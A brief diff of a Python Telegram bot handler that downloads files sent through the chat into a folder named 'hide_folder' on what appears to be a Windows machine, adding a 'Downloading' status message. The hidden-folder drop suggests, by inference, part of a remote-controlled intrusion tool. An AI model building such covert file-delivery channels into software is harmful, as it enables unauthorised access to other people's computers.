@@ -80,6 +80,7 @@ def handle(msg):
 			file_id = msg['document']['file_id']
 			file_path = bot.getFile(file_id=file_id)['file_path']
 			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
+			bot.sendMessage(chat_id, 'Downloading ' + file_name)
 			file = (requests.get(link, stream=True)).raw
 			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
